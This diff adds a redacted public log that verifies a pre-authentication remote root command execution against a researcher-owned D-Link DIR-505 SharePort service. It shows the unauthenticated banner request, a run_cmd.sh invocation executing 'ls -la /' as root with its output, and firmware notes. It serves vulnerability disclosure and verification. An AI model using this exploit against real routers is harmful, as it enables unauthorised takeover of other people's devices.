@@ -1,0 +1,54 @@
+================================================================================
+REAL-DEVICE VERIFICATION (redacted) — public version
+================================================================================
+Date: 2026-10-14
+Device: D-Link DIR-505 (researcher-owned hardware), SharePort Web File Access on TCP/8181
+Method: CVE_webfile_cgi_rce/poc/run_cmd.sh
+        (pre-auth stack overflow -> ROP -> system() as root)
+
+--- 1) SharePort banner (unauthenticated) --------------------------------------
+$ curl -s 'http://x.x.x.x:8181/dws/api/Login'; echo
+{"status": "ok", "errno": null, "uid": "13943167", "challenge": "fa131f67-99d9-d7ae-f761-0cfc3f3ba9ea", "version": "0107"}
+
+  ("version": "0107" is identical to the emulated DIR-505 1.10B02 build — the same
+   SharePort webfile_cgi.cgi family as the exploited binary.)
+
+--- 2) Pre-auth root command execution: ls -la / --------------------------------
+$ bash run_cmd.sh x.x.x.x 8181 "ls -la /"
+[*] target : x.x.x.x:8181
+[*] command: ls -la /
+[*] run (as root) ...
+    HTTP 500
+----- output -----
+drwxrwxrwx   16 root     root          251 Nov 28  2014 .
+drwxrwxrwx   16 root     root          251 Nov 28  2014 ..
+-rwxrwxrwx    1 root     root            0 Nov 10  2008 .dummy
+drwxr-xr-x    2 root     root          442 Nov 28  2014 bin
+drwxrwxrwx    3 root     root         1447 Nov 28  2014 dev
+drwxr-xr-x    8 root     root            0 Jun 27 02:18 etc
+drwxrwxrwx    4 root     root         2068 Nov 28  2014 lib
+drwxr-xr-x    3 root     root           30 Nov 28  2014 libexec
+lrwxrwxrwx    1 root     root           11 Nov 28  2014 linuxrc -> bin/busybox
+drwxrwxrwx    2 root     root           29 Nov 11  2008 lost+found
+drwxrwxrwx    8 root     root          527 Nov 28  2014 mnt
+dr-xr-xr-x   53 root     root            0 Jan  1  1970 proc
+drwxrwxrwx    2 root     root           45 Nov 11  2008 root
+drwxr-xr-x    2 root     root          685 Nov 28  2014 sbin
+drwxr-xr-x    3 nobody   nobody          0 Jul 18 23:47 tmp
+drwxrwxrwx    7 root     root          101 Nov 28  2014 usr
+drwxr-xr-x    9 root     root            0 Jan  1  1970 var
+-rw-r--r--    1 root     root           17 Nov 28  2014 version
+drwxr-xr-x    9 root     root            0 Jun 12 04:12 www
+------------------
+[*] cleaned up.
+
+--- 3) Notes -------------------------------------------------------------------
+- Filesystem dates "Nov 28 2014" match the 1.10B02 firmware build
+  (DIR-505_A1_FW110B02.bin, MD5 cd13a30e3f971c23eace3ae94380f28b). No "firmadyne"
+  directory is present (real hardware, not emulation).
+- The command executed as root (the CGI process runs as root; the output file was
+  written into /www/webfile_access/ and retrieved over HTTP from the same 8181
+  service without any credentials).
+- Cleanup was performed automatically by run_cmd.sh; no files or extra ports were
+  left behind.
+================================================================================
